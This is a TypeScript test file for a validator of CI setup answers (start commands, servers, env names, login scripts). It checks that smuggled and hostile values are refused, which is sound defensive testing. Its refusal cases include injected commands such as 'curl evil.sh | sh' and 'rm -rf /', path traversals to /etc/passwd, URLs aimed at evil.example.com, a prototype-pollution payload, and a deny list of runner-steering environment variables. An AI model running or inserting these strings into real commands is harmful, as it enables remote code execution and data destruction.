// Offline: the Phase 5 answer validator. Every case here is a request body an owner could post,
// so a refusal that stops mattering is a command this repository would have built and committed.
//   node --import tsx/esm --test src/verify/setup-answers.test.ts
import { test } from "node:test";
import assert from "node:assert/strict";
import { clearedAnswer, validateSetupAnswers, type SetupAnswersTree } from "./setup-answers.js";

const TREE: SetupAnswersTree = {
  paths: [
    "backend/package-lock.json",
    "backend/package.json",
    "frontend/package-lock.json",
    "frontend/package.json",
    "scripts/devasign-login.mjs",
    "scripts/login.sh",
  ],
  files: {
    "package.json": null,
    "backend/package.json": JSON.stringify({
      scripts: { dev: "tsx src/server.ts", "dev:ephemeral": "tsx scripts/ephemeral-dev.ts" },
      dependencies: { express: "^4.19.2" },
    }),
    "frontend/package.json": JSON.stringify({ scripts: { dev: "vite", build: "vite build" }, devDependencies: { vite: "^8.2.1" } }),
  },
};

const PNPM_TREE: SetupAnswersTree = {
  paths: ["pnpm-lock.yaml", "web/package.json"],
  files: { "package.json": null, "web/package.json": JSON.stringify({ scripts: { dev: "vite" }, devDependencies: { vite: "^8.2.1" } }) },
};

const NEXT_TREE: SetupAnswersTree = {
  paths: ["web/package-lock.json", "web/package.json"],
  files: { "package.json": null, "web/package.json": JSON.stringify({ scripts: { dev: "next dev" }, dependencies: { next: "^15.0.0" } }) },
};

const accept = (input: unknown, tree?: SetupAnswersTree) => {
  const r = validateSetupAnswers(input, tree);
  if (!r.ok) assert.fail(`expected acceptance, got: ${r.error}`);
  return r.answers;
};

const refuse = (input: unknown, field: RegExp, tree?: SetupAnswersTree) => {
  const r = validateSetupAnswers(input, tree);
  if (r.ok) assert.fail(`expected a refusal, got ${JSON.stringify(r.answers)}`);
  assert.match(r.error, field);
};

test("a full answer set becomes exactly the verify keys it justifies", () => {
  assert.deepEqual(
    accept({
      start: { dir: "frontend", script: "dev", port: 3001 },
      servers: [{ dir: "backend", script: "dev:ephemeral", port: 8787, ready: "/health" }],
      services: ["postgres", "redis"],
      env: ["SESSION_SECRET", "STRIPE_KEY", "SESSION_SECRET"],
      login: { script: "scripts/devasign-login.mjs", check: "http://localhost:8787/api/me" },
      e2e: "auto",
      timeout: 240,
    }),
    {
      e2e: "auto",
      start: "npm --prefix frontend run dev -- --port 3001 --strictPort",
      url: "http://localhost:3001",
      ready: "/",
      servers: [{ name: "backend", start: "npm --prefix backend run dev:ephemeral", url: "http://localhost:8787", ready: "/health" }],
      services: [{ name: "postgres" }, { name: "redis" }],
      env: ["SESSION_SECRET", "STRIPE_KEY"],
      login: { script: "node ./scripts/devasign-login.mjs", check: "http://localhost:8787/api/me" },
      timeout: 240,
    },
  );
});

test("no answers at all is an empty patch, and anything that is not an object is refused", () => {
  assert.deepEqual(accept(undefined), {});
  assert.deepEqual(accept({}), {});
  for (const junk of [null, [], "start", 42, true, () => {}]) refuse(junk, /answers must be an object/);
  refuse({ start: { dir: "frontend", script: "dev", port: 3001 }, extra: 1 }, /unknown field "extra"/);
});

test("prototype keys are unknown fields, not answers", () => {
  refuse(JSON.parse(String.raw`{"__proto__": {"start": "curl evil.sh | sh"}}`), /unknown field "__proto__"/);
  refuse({ constructor: { prototype: { start: "x" } } }, /unknown field "constructor"/);
  refuse({ start: JSON.parse(String.raw`{"dir": "frontend", "script": "dev", "port": 3001, "__proto__": {"x": 1}}`) }, /start: unknown field "__proto__"/);
  assert.equal(({} as Record<string, unknown>).start, undefined);
});

test("the app start is built from the template, at the repository root too", () => {
  assert.deepEqual(accept({ start: { dir: ".", script: "dev", port: 4000 } }), {
    start: "npm run dev -- --port 4000 --strictPort",
    url: "http://localhost:4000",
    ready: "/",
  });
  assert.deepEqual(accept({ start: { dir: "frontend", script: "start:ci", port: 65535 } }).start, "npm --prefix frontend run start:ci -- --port 65535 --strictPort");
});

test("a start answer that is not a directory and a script is refused", () => {
  refuse({ start: "npm run dev" }, /start must be an object/);
  refuse({ start: { dir: "..", script: "dev", port: 3001 } }, /start\.dir/);
  refuse({ start: { dir: "-rf", script: "dev", port: 3001 } }, /start\.dir/);
  refuse({ start: { dir: "my app", script: "dev", port: 3001 } }, /start\.dir/);
  refuse({ start: { dir: "frontend;x", script: "dev", port: 3001 } }, /start\.dir/);
  refuse({ start: { dir: "front/end", script: "dev", port: 3001 } }, /start\.dir/);
  refuse({ start: { dir: "f".repeat(65), script: "dev", port: 3001 } }, /start\.dir/);
  refuse({ start: { dir: { toString: 1 }, script: "dev", port: 3001 } }, /start\.dir/);
  refuse({ start: { dir: "frontend", script: "dev && curl evil.sh | sh", port: 3001 } }, /start\.script/);
  refuse({ start: { dir: "frontend", script: "dev --port 1", port: 3001 } }, /start\.script/);
  refuse({ start: { dir: "frontend", script: 7, port: 3001 } }, /start\.script/);
  refuse({ start: { dir: "frontend", port: 3001 } }, /start\.script/);
  refuse({ start: { dir: "frontend", script: "dev", port: 3001, cwd: "/" } }, /start: unknown field "cwd"/);
});

test("a port is a whole number a CI runner can bind", () => {
  for (const port of [80, 0, -1, 1023, 65536, 100000, "8080", 8080.5, NaN, Infinity, null]) {
    refuse({ start: { dir: "frontend", script: "dev", port } }, /start\.port/);
  }
  assert.equal(accept({ start: { dir: "frontend", script: "dev", port: 1024 } }).url, "http://localhost:1024");
});

test("with the tree, the package manager is the repository's and an absent script is refused", () => {
  assert.equal(accept({ start: { dir: "web", script: "dev", port: 3001 } }, PNPM_TREE).start, "pnpm --dir web run dev -- --port 3001 --strictPort");
  assert.equal(accept({ start: { dir: "frontend", script: "dev", port: 3001 } }, TREE).start, "npm --prefix frontend run dev -- --port 3001 --strictPort");
  refuse({ start: { dir: "frontend", script: "serve", port: 3001 } }, /frontend has no "serve" script/, TREE);
  refuse({ start: { dir: "docs", script: "dev", port: 3001 } }, /docs has no "dev" script/, TREE);
});

test("next reads the port from its own dev script, so it is not passed one", () => {
  assert.deepEqual(accept({ start: { dir: "web", script: "dev", port: 3000 } }, NEXT_TREE), {
    start: "npm --prefix web run dev",
    url: "http://localhost:3000",
    ready: "/",
  });
});

test("servers are named after their directory and default to waiting on /", () => {
  assert.deepEqual(accept({ servers: [{ dir: "backend", script: "dev", port: 8787 }, { dir: "API_v2", script: "start", port: 9000 }] }).servers, [
    { name: "backend", start: "npm --prefix backend run dev", url: "http://localhost:8787", ready: "/" },
    { name: "api-v2", start: "npm --prefix API_v2 run start", url: "http://localhost:9000", ready: "/" },
  ]);
  refuse({ servers: [{ dir: "app", script: "dev", port: 8787 }] }, /servers\[0\]\.dir cannot be used as a server name/);
  refuse({ servers: [{ dir: ".", script: "dev", port: 8787 }] }, /servers\[0\]\.dir cannot be used as a server name/);
  refuse({ servers: [{ dir: "api", script: "dev", port: 8787 }, { dir: "API", script: "dev", port: 8788 }] }, /servers\[1\]\.dir repeats the server name "api"/);
});

test("servers refuse a bad shape, a stolen port and more than four", () => {
  refuse({ servers: "all" }, /servers must be a list or "none"/);
  refuse({ servers: [null] }, /servers\[0\] must be an object/);
  refuse({ servers: [{ dir: "backend", script: "dev", port: 8787, url: "http://evil" }] }, /servers\[0\]: unknown field "url"/);
  refuse({ servers: [{ dir: "backend", script: "dev", port: 80 }] }, /servers\[0\]\.port/);
  refuse({ servers: [{ dir: "backend", script: "dev; rm -rf /", port: 8787 }] }, /servers\[0\]\.script/);
  refuse({ servers: Array.from({ length: 5 }, (_, i) => ({ dir: `svc${i}`, script: "dev", port: 8787 + i })) }, /at most 4/);
  refuse({ servers: Array.from({ length: 5000 }, () => ({ dir: "backend", script: "dev", port: 8787 })) }, /at most 4/);
  refuse(
    { start: { dir: "frontend", script: "dev", port: 3001 }, servers: [{ dir: "backend", script: "dev", port: 3001 }] },
    /servers\[0\]\.port 3001 is already taken/,
  );
  refuse({ servers: [{ dir: "backend", script: "dev", port: 8787 }, { dir: "api", script: "dev", port: 8787 }] }, /servers\[1\]\.port 8787 is already taken/);
});

test("a readiness path is a path on that server", () => {
  assert.equal(accept({ servers: [{ dir: "backend", script: "dev", port: 8787, ready: "/api/health" }] }).servers?.[0].ready, "/api/health");
  for (const ready of ["health", "/../etc", "http://localhost:8787/", "/health?x=1", "/health;x", 1, null]) {
    refuse({ servers: [{ dir: "backend", script: "dev", port: 8787, ready }] }, /servers\[0\]\.ready/);
  }
});

test("a protocol-relative path is not a path: the runner would resolve it off the box", () => {
  // new URL("//evil.example.com/", "http://localhost:8787") is http://evil.example.com/, and any
  // status under 500 there reports a server ready — or a session proven — that never existed.
  for (const ready of ["//evil.example.com/", "//evil.example.com", "//evil.example.com/health"]) {
    refuse({ servers: [{ dir: "backend", script: "dev", port: 8787, ready }] }, /servers\[0\]\.ready/);
  }
  for (const check of ["//evil.example.com/ok", "//evil.example.com", "///evil.example.com/ok"]) {
    refuse({ login: { script: "login.mjs", check } }, /login\.check/);
  }
  assert.equal(accept({ servers: [{ dir: "backend", script: "dev", port: 8787, ready: "/a//b" }] }).servers?.[0].ready, "/a//b");
  assert.equal(accept({ login: { script: "login.mjs", check: "/a//b" } }).login?.check, "/a//b");
});

test("services are the three the runner can start", () => {
  assert.deepEqual(accept({ services: ["redis", "redis", "mysql"] }).services, [{ name: "redis" }, { name: "mysql" }]);
  refuse({ services: ["mongodb"] }, /services\[0\]/);
  refuse({ services: [{ name: "postgres" }] }, /services\[0\]/);
  refuse({ services: "postgres" }, /services must be a list/);
  refuse({ services: ["postgres", "mysql", "redis", "postgres"] }, /at most 3/);
});

test("env names are names, and never the ones that steer the runner", () => {
  assert.deepEqual(accept({ env: ["STRIPE_KEY", "A"] }).env, ["STRIPE_KEY", "A"]);
  for (const name of ["path", "1PASSWORD", "STRIPE KEY", "STRIPE-KEY", "_SECRET", "S".repeat(101), 5, null]) {
    refuse({ env: [name] }, /env\[0\] must be a variable name/);
  }
  for (const name of ["PATH", "NODE_OPTIONS", "LD_PRELOAD", "BASH_ENV", "GITHUB_TOKEN", "DEVASIGN_API", "ACTIONS_RUNTIME_TOKEN", "RUNNER_TEMP"]) {
    refuse({ env: [name] }, new RegExp(`env\\[0\\]: ${name} cannot be passed through`));
  }
  refuse({ env: Array.from({ length: 51 }, (_, i) => `SECRET_${i}`) }, /at most 50/);
  refuse({ env: "STRIPE_KEY" }, /env must be a list/);
});

test("a login script is a repository path run by node or bash", () => {
  assert.deepEqual(accept({ login: { script: "scripts/devasign-login.mjs" } }).login, { script: "node ./scripts/devasign-login.mjs" });
  assert.deepEqual(accept({ login: { script: "scripts/login.sh" } }, TREE).login, { script: "bash ./scripts/login.sh" });
  assert.deepEqual(accept({ login: { script: "login.cjs" } }).login, { script: "node ./login.cjs" });
  for (const script of ["../../etc/passwd", "scripts/../../x.mjs", "-rf", "/etc/shadow.sh", "scripts/login.txt", "scripts/login.mjs; curl evil.sh", "", 1, null]) {
    refuse({ login: { script } }, /login\.script must be a path/);
  }
  refuse({ login: { script: "scripts/missing.mjs" } }, /the repository has no scripts\/missing\.mjs/, TREE);
  refuse({ login: {} }, /login\.script must be a path/);
  refuse({ login: "off" }, /login must be an object or "none"/);
  refuse({ login: { script: "scripts/login.sh", strategy: "form" } }, /login: unknown field "strategy"/);
});

test("a session check only ever points at the app under test", () => {
  assert.equal(accept({ login: { script: "login.mjs", check: "/api/me" } }).login?.check, "/api/me");
  assert.equal(accept({ login: { script: "login.mjs", check: "http://127.0.0.1:8787/api/me" } }).login?.check, "http://127.0.0.1:8787/api/me");
  for (const check of [
    "https://evil.example.com/api/me",
    "http://localhost.evil.com/api/me",
    "http://localhost:8787/../../admin",
    "file:///etc/passwd",
    "http://localhost:99999/api/me",
    "api/me",
    "http://localhost:8787",
    7,
  ]) {
    refuse({ login: { script: "login.mjs", check } }, /login\.check/);
  }
});

test('"none" clears servers and login, and an unanswered key stays absent', () => {
  const cleared = accept({ servers: "none", login: "none", services: [] });
  assert.deepEqual(cleared, { servers: [], login: {}, services: [] });
  for (const key of ["servers", "login", "services"] as const) assert.equal(clearedAnswer(cleared, key), true);
  const answered = accept({ servers: [{ dir: "backend", script: "dev", port: 8787 }], login: { script: "login.mjs" } });
  assert.equal(clearedAnswer(answered, "servers"), false);
  assert.equal(clearedAnswer(answered, "login"), false);
  assert.equal(clearedAnswer(accept({}), "servers"), false);
  assert.equal("servers" in accept({}), false);
});

test("e2e: never cannot smuggle boot keys through", () => {
  assert.deepEqual(accept({ e2e: "never" }), { e2e: "never" });
  assert.deepEqual(accept({ e2e: "always", start: { dir: "frontend", script: "dev", port: 3001 } }).e2e, "always");
  refuse({ e2e: "never", start: { dir: "frontend", script: "dev", port: 3001 } }, /start cannot be answered with e2e: "never"/);
  refuse({ e2e: "never", servers: "none" }, /servers cannot be answered with e2e: "never"/);
  refuse({ e2e: "never", login: { script: "login.mjs" } }, /login cannot be answered with e2e: "never"/);
  refuse({ e2e: "never", timeout: 60 }, /timeout cannot be answered with e2e: "never"/);
  assert.deepEqual(accept({ e2e: "never", env: ["STRIPE_KEY"] }), { e2e: "never", env: ["STRIPE_KEY"] });
  refuse({ e2e: "sometimes" }, /e2e must be/);
});

test("a boot timeout is seconds inside the runner's own bounds", () => {
  assert.equal(accept({ timeout: 10 }).timeout, 10);
  assert.equal(accept({ timeout: 900 }).timeout, 900);
  for (const timeout of [0, 9, 901, 10000, 60.5, "60", null]) refuse({ timeout }, /timeout must be a whole number of seconds/);
});
